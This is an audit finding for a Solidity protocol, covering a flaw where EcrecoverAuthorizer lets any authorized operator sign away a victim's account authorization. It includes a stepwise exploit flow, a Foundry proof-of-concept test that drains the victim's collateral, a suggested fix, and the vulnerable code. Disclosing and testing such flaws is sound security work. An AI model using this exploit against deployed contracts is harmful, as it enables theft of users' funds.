### Title
Authorized operator can use EcrecoverAuthorizer to grant arbitrary third-party authorization over victim's account - (File: src/periphery/EcrecoverAuthorizer.sol)

### Summary

`EcrecoverAuthorizer.setIsAuthorized` accepts a signature from any address that `isAuthorized[authorizer][signer]` is true for on Midnight, not only from the `authorizer` themselves. Because `Midnight.setIsAuthorized` also accepts calls from any address authorized by the `onBehalf` account, an operator who holds `isAuthorized[victim][operator] == true` can sign an `Authorization{authorizer=victim, authorized=malicious, isAuthorized=true}` struct and submit it through `EcrecoverAuthorizer`, causing Midnight to record `isAuthorized[victim][malicious] = true` without any action by the victim. The malicious address can then call `withdrawCollateral` and drain the victim's collateral.

### Finding Description

**Exact code path:**

`EcrecoverAuthorizer.setIsAuthorized` (lines 33–36) performs the signer check:

```solidity
require(
    signer == authorization.authorizer || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
    Unauthorized()
);
``` [1](#0-0) 

This allows `signer` to be any address that the `authorizer` has previously authorized on Midnight — not only the `authorizer` themselves. The function then calls:

```solidity
IMidnight(MIDNIGHT).setIsAuthorized(authorization.authorized, authorization.isAuthorized, authorization.authorizer);
``` [2](#0-1) 

`Midnight.setIsAuthorized` checks:

```solidity
require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
isAuthorized[onBehalf][authorized] = newIsAuthorized;
``` [3](#0-2) 

Since `msg.sender` is `EcrecoverAuthorizer` and `isAuthorized[victim][EcrecoverAuthorizer] == true` (precondition), this check passes and `isAuthorized[victim][malicious]` is set to `true`.

**Exploit flow:**

Preconditions:
- `isAuthorized[victim][operator] == true`
- `isAuthorized[victim][EcrecoverAuthorizer] == true`

Steps:
1. Operator constructs `Authorization{authorizer=victim, authorized=malicious, isAuthorized=true, nonce=nonce[victim], deadline=future}` and signs it with operator's key.
2. Operator (or anyone) calls `EcrecoverAuthorizer.setIsAuthorized(auth, sig)`.
3. `ecrecover` returns `operator`; the check `isAuthorized[victim][operator] == true` passes.
4. `Midnight.setIsAuthorized(malicious, true, victim)` is called with `msg.sender = EcrecoverAuthorizer`; the check `isAuthorized[victim][EcrecoverAuthorizer] == true` passes.
5. `isAuthorized[victim][malicious] = true` is written.
6. Malicious calls `Midnight.withdrawCollateral(market, 0, amount, victim, malicious)`.
7. The check `isAuthorized[victim][malicious] == true` passes; victim's collateral is transferred to malicious.

**Why existing checks fail:**

The nonce check (line 26) only prevents replay of the same authorization; it does not prevent an operator from constructing a *new* authorization for a different `authorized` address. The deadline check is trivially satisfiable. The `Midnight.setIsAuthorized` authorization check is satisfied by `EcrecoverAuthorizer` being pre-authorized. No check anywhere verifies that the signer of the `Authorization` struct is the `authorizer` themselves. [4](#0-3) 

### Impact Explanation

A victim whose account has both `EcrecoverAuthorizer` and any operator authorized loses the invariant that only their own signed intent can expand their authorization set. Any such operator can unilaterally grant a malicious address full authorization over the victim's account, enabling permanent seizure of all collateral via `withdrawCollateral`, or any other authorized action (withdraw, repay, setConsumed, further authorization changes). [3](#0-2) 

### Likelihood Explanation

The preconditions are realistic and common: users are expected to authorize `EcrecoverAuthorizer` to use the signature-based flow, and they may also authorize operators (e.g., bots, portfolio managers, smart contract integrations). Both authorizations being active simultaneously is a normal operational state. The attack requires no special privileges, no oracle manipulation, and no user mistake — only the attacker holding an existing `isAuthorized` grant. It is repeatable as long as the operator authorization is not revoked.

### Recommendation

Remove the delegated-signer branch from `EcrecoverAuthorizer.setIsAuthorized`. The function should only accept a signature from `authorization.authorizer` directly:

```solidity
require(signer == authorization.authorizer, Unauthorized());
```

The `isAuthorized` delegation check is appropriate for `Midnight.setIsAuthorized` (direct on-chain calls by operators), but it must not be replicated in `EcrecoverAuthorizer`, where the whole purpose is to bind a specific key's off-chain signed intent to an on-chain state change. Allowing any authorized operator to sign on behalf of the authorizer breaks the signature-binding invariant. [1](#0-0) 

### Proof of Concept

```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import {BaseTest} from "./BaseTest.sol";
import {Authorization, Signature, AUTHORIZATION_TYPEHASH, EIP712_DOMAIN_TYPEHASH}
    from "../src/periphery/interfaces/IEcrecoverAuthorizer.sol";

contract OperatorGrantsMaliciousAuthTest is BaseTest {
    function testOperatorGrantsMaliciousAuth() public {
        address victim   = borrower;
        address operator = makeAddr("operator");
        address malicious = makeAddr("malicious");
        uint256 operatorKey; (operator, operatorKey) = makeAddrAndKey("operator");

        // Victim authorizes EcrecoverAuthorizer and operator on Midnight
        vm.prank(victim);
        midnight.setIsAuthorized(address(ecrecoverAuthorizer), true, victim);
        vm.prank(victim);
        midnight.setIsAuthorized(operator, true, victim);

        // Supply collateral for victim
        address collateralToken = market.collateralParams[0].token;
        uint256 amount = 1000;
        deal(collateralToken, victim, amount);
        vm.prank(victim);
        ERC20(collateralToken).approve(address(midnight), amount);
        vm.prank(victim);
        midnight.supplyCollateral(market, 0, amount, victim);

        // Operator signs Authorization{authorizer=victim, authorized=malicious, isAuthorized=true}
        Authorization memory auth = Authorization({
            authorizer: victim,
            authorized: malicious,
            isAuthorized: true,
            nonce: ecrecoverAuthorizer.nonce(victim),
            deadline: block.timestamp + 1 days
        });
        bytes32 structHash = keccak256(abi.encode(AUTHORIZATION_TYPEHASH, auth));
        bytes32 domainSep  = keccak256(abi.encode(EIP712_DOMAIN_TYPEHASH, block.chainid, address(ecrecoverAuthorizer)));
        bytes32 digest     = keccak256(bytes.concat("\x19\x01", domainSep, structHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(operatorKey, digest);
        Signature memory sig = Signature({v: v, r: r, s: s});

        // Operator submits — should revert if fixed, but currently succeeds
        ecrecoverAuthorizer.setIsAuthorized(auth, sig);

        // Assert: malicious is now authorized for victim (the bug)
        assertTrue(midnight.isAuthorized(victim, malicious));

        // Malicious drains victim's collateral
        vm.prank(malicious);
        midnight.withdrawCollateral(market, 0, amount, victim, malicious);

        assertEq(ERC20(collateralToken).balanceOf(malicious), amount);
        assertEq(midnight.collateral(toId(market), victim, 0), 0);
    }
}
```

Expected assertions with the bug present: both `assertTrue` and final `assertEq` pass. With the fix applied (`require(signer == authorization.authorizer)`), `ecrecoverAuthorizer.setIsAuthorized` reverts with `Unauthorized` and collateral remains intact. [5](#0-4) [6](#0-5)

    function setIsAuthorized(Authorization memory authorization, Signature calldata signature) external {
        require(block.timestamp <= authorization.deadline, Expired());
        require(authorization.nonce == nonce[authorization.authorizer]++, InvalidNonce());

        bytes32 hashStruct = keccak256(abi.encode(AUTHORIZATION_TYPEHASH, authorization));
        bytes32 domainSeparator = keccak256(abi.encode(EIP712_DOMAIN_TYPEHASH, block.chainid, address(this)));
        bytes32 digest = keccak256(bytes.concat("\x19\x01", domainSeparator, hashStruct));
        address signer = ecrecover(digest, signature.v, signature.r, signature.s);
        require(signer != address(0), InvalidSignature());
        require(
            signer == authorization.authorizer || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
            Unauthorized()
        );

        emit SetIsAuthorized(
            msg.sender,
            authorization.authorizer,
            authorization.authorized,
            authorization.isAuthorized,
            authorization.nonce
        );

        IMidnight(MIDNIGHT)
            .setIsAuthorized(authorization.authorized, authorization.isAuthorized, authorization.authorizer);
    }
